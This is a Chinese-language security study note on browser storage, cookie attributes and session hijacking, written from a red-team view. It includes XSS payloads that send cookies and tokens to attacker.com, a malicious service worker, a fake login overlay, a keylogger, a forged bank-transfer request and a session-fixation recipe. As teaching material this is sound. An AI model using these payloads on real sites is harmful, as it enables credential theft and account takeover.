## 目录

- [[#一、Cookie深度解析|一、Cookie深度解析]]
- [[#二、Cookie安全属性|二、Cookie安全属性]]
- [[#三、localStorage与sessionStorage|三、localStorage与sessionStorage]]
- [[#四、IndexedDB与WebSQL|四、IndexedDB与WebSQL]]
- [[#五、Cookie窃取技术|五、Cookie窃取技术]]
- [[#六、Session劫持完整流程|六、Session劫持完整流程]]
- [[#七、Token存储的前端安全问题|七、Token存储的前端安全问题]]
- [[#八、红队视角总结|八、红队视角总结]]

---

## 一、Cookie深度解析

### Cookie结构

```
Set-Cookie: sessionId=abc123; Domain=.example.com; Path=/; 
 Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

### JS操作Cookie

```javascript
// 读取所有Cookie（无法读取HttpOnly！）
document.cookie;
// 返回："username=admin; theme=dark; tracking_id=xyz789"

// 设置Cookie
document.cookie = "key=value; path=/; max-age=3600";

// 删除Cookie（设过期时间为过去）
document.cookie = "key=; expires=Thu, 01 Jan 1970 00:00:00 GMT";
```

### Cookie的JS可读性

| Cookie设置了什么 | document.cookie能读取吗？ |
|-----------------|---------------------------|
| 无特殊属性 | 可以 |
| HttpOnly | 不可以（这是重点！） |
| Secure | 仅HTTPS页面可读 |
| Path | 仅在匹配路径下可见 |

## 二、Cookie安全属性

### 完整属性表

| 属性 | 作用 | 安全影响 |
|------|------|---------|
| `HttpOnly` | 禁止JS读取 | 防御XSS窃取Cookie（最关键的属性之一） |
| `Secure` | 仅HTTPS传输 | 防御中间人嗅探 |
| `SameSite=Strict` | 仅同站请求携带 | 完全防御CSRF |
| `SameSite=Lax` | 顶级导航携带 | 大部分防御CSRF |
| `SameSite=None` | 所有请求携带 | Cookie可跨站（需配合Secure） |
| `Domain` | Cookie作用域 | 设置不当可被子域窃取 |
| `Path` | Cookie路径范围 | 限制Cookie粒度 |
| `Max-Age` / `Expires` | 过期时间 | Session Cookie更安全 |

### SameSite深度理解

```
SameSite=Strict:
 - 用户从第三方网站点击链接 → 不会带Cookie
 - CSRF不能携带Cookie → CSRF完全防御
 - 但用户体验差（点击链接需要重新登录）

SameSite=Lax (Chrome默认):
 - GET顶级导航（用户点击链接）→ 会带Cookie 
 - iframe/subresource → 不会带Cookie
 - POST跨站表单 → 不会带Cookie （CSRF防御）

SameSite=None:
 - 需要同时设置 Secure
 - 所有请求都会带Cookie
 - CSRF攻击可用 → 必须配合CSRF Token
```

## 三、localStorage与sessionStorage

### API对比

```javascript
// localStorage —— 持久化存储（无过期时间）
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();

// sessionStorage —— 会话级存储（标签页关闭即清除）
sessionStorage.setItem('key', 'value');
sessionStorage.getItem('key');
sessionStorage.removeItem('key');
sessionStorage.clear();
```

### 与Cookie对比

| 特性 | Cookie | localStorage | sessionStorage |
|------|--------|-------------|----------------|
| 容量 | ~4KB | ~5-10MB | ~5-10MB |
| 有效期 | 可设过期 | 永久 | 标签页级 |
| 自动发送到服务器 | 是 | 否 | 否 |
| HttpOnly保护 | 是 | 否 | 否 |
| 同源访问 | 是 | 是 | 是（且同标签页） |
| XSS可读取 | 视HttpOnly | 总是可以 | 总是可以 |

### 安全对比

```javascript
// Cookie（安全）：HttpOnly防止XSS读取
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Strict

// localStorage（不安全）：XSS可直接读取
localStorage.setItem('token', 'abc123');
// 任何XSS都可以做：
// fetch('https://attacker.com/steal?t=' + localStorage.getItem('token'))

// 结论：敏感Token存在localStorage ≠ 安全！
// 即使没有Cookie窃取风险，XSS仍然可以通过JS发起请求
```

## 四、IndexedDB与WebSQL

### IndexedDB

```javascript
// 打开数据库
const request = indexedDB.open('MyDatabase', 1);

request.onsuccess = function(e) {
 const db = e.target.result;
 
 // 创建事务
 const tx = db.transaction('users', 'readwrite');
 const store = tx.objectStore('users');
 
 // 写入数据
 store.add({ id: 1, name: 'admin', token: 'secret_token' });
 
 // 读取数据
 const getReq = store.get(1);
 getReq.onsuccess = function() { console.log(getReq.result); };
};
```

### 安全影响

- IndexedDB没有HttpOnly等保护机制
- 同源的JS可以读写所有IndexedDB数据
- XSS可以遍历IndexedDB窃取缓存数据
- 一些PWA(Progressive Web App)用IndexedDB存储敏感数据 → 攻击面

## 五、Cookie窃取技术

### 基本窃取

```javascript
// XSS payload - 窃取Cookie
fetch('https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie));

// 使用Image（绕过某些CSP）
new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
```

### 即使HttpOnly也能利用Session

```javascript
// HttpOnly阻止了JS读取Cookie，但不阻止Cookie被浏览器自动发送！
// 攻击者可以在XSS中直接发起请求，浏览器会自动携带HttpOnly Cookie

// 直接利用当前Session发起恶意操作
fetch('https://bank.com/transfer', {
 method: 'POST',
 credentials: 'include', // 自动带HttpOnly Cookie
 headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
 body: 'to=attacker&amount=10000'
});
// 结论：HttpOnly防止Cookie被窃取，但不防止Cookie被使用！
```

### 通过Service Worker窃取

```javascript
// Service Worker可以拦截所有请求（包括带HttpOnly Cookie的）
// 注册恶意SW：
navigator.serviceWorker.register('/evil-sw.js');

// evil-sw.js:
self.addEventListener('fetch', event => {
 const url = event.request.url;
 // 将所有请求URL发送到攻击者服务器
 fetch('https://attacker.com/log?url=' + encodeURIComponent(url));
 
 // 正常处理请求
 event.respondWith(fetch(event.request));
});
```

## 六、Session劫持完整流程

### 完整攻击链

```
阶段1：信息收集
 - 确认目标使用Session机制（Cookie名如PHPSESSID, JSESSIONID）
 - 确认Cookie是否有HttpOnly、Secure、SameSite

阶段2：获取Session凭证
 路径A（无HttpOnly）：
 XSS → document.cookie → 外泄到攻击者服务器
 
 路径B（有HttpOnly）：
 XSS → 直接利用当前页面发起操作（不看Cookie值）
 或：中间人攻击 → 网络层窃取Cookie

阶段3：Session固定攻击（Session Fixation）
 - 攻击者先获得一个Session ID
 - 诱导受害者使用相同的Session ID登录
 - 攻击者用已知道的Session ID访问受害者的Session

阶段4：Session重用
 - 将窃取的Cookie注入浏览器
 - 访问目标网站 → 服务器认为你是受害者
```

### Session Fixation攻击

```php
// 1. 攻击者访问网站 → 获得 Session ID: abc123
// 2. 攻击者构造URL：https://target.com/login?PHPSESSID=abc123
// 3. 诱导受害者点击该URL
// 4. 受害者登录 → Session abc123 现在关联了受害者的身份
// 5. 攻击者用 Cookie: PHPSESSID=abc123 访问 → 以受害者身份操作
```

### XSS中的高级利用

```javascript
// 即使HttpOnly，XSS仍可做很多事：

// 1. 修改页面内容进行钓鱼
document.body.innerHTML = `
 <div style="position:fixed;top:0;left:0;right:0;bottom:0;background:white;z-index:9999">
 <h1>Session已过期，请重新登录</h1>
 <form action="https://attacker.com/steal" method="POST">
 <input name="username" placeholder="用户名">
 <input type="password" name="password" placeholder="密码">
 </form>
 </div>
`;

// 2. 添加键盘记录器
document.addEventListener('keypress', function(e) {
 fetch('https://attacker.com/keylog?k=' + e.key);
});

// 3. 修改表单action
document.querySelector('form').action = 'https://attacker.com/steal';
```

## 七、Token存储的前端安全问题

### 常见Token存储方式的优劣

| 存储方式 | XSS窃取 | CSRF | 持久化 | 推荐 |
|---------|:---:|:---:|:---:|:---:|
| Cookie + HttpOnly + Secure + SameSite | | 防御 | 是 | 推荐 |
| localStorage | | 防御 | 是 | |
| sessionStorage | | 防御 | 否 | △ |
| 内存变量（闭包） | | | 否（刷新就丢）| △ |
| Cookie(无HttpOnly) | | 防御 | 是 | |

### JWT存储的最佳实践

```javascript
// 方案：Access Token(内存) + Refresh Token(Cookie HttpOnly)

// Access Token：存在内存（JS变量）
let accessToken = null;

// Refresh Token：存在Cookie（HttpOnly, Secure, SameSite=Strict）
// 自动携带，JS无法读取

// Token刷新流程
async function refreshAccessToken() {
 const resp = await fetch('/api/refresh', {
 method: 'POST',
 credentials: 'include', // 自动带Refresh Token Cookie
 });
 const data = await resp.json();
 accessToken = data.access_token; // 新Token放内存
}
```

## 八、红队视角总结

### Cookie攻击检查清单

- [ ] Cookie是否有HttpOnly？（如果没有 → 直接窃取）
- [ ] Cookie是否有Secure？（如果没有 → 可中间人）
- [ ] Cookie是否有SameSite？（如果没有 → CSRF直接利用）
- [ ] Session ID是否在登录后重新生成？（如果没有 → Session Fixation）
- [ ] Token是否存储在localStorage？（如果是 → XSS可直接窃取）
- [ ] 是否存在Flash Cookie / Silverlight等遗留存储？
- [ ] Service Worker是否能被注册/劫持？

### 工具

| 工具 | 用途 |
|------|------|
| Chrome DevTools → Application → Cookies | 查看Cookie属性 |
| EditThisCookie (Chrome扩展) | Cookie编辑 |
| Burp Suite Sequencer | Session Cookie随机性分析 |
| Cookie-Editor (Firefox) | Cookie操作 |

---
**返回** [[JS基础总目录|JavaScript 总目录]] | [[../前端基础总目录|前端基础总目录]]
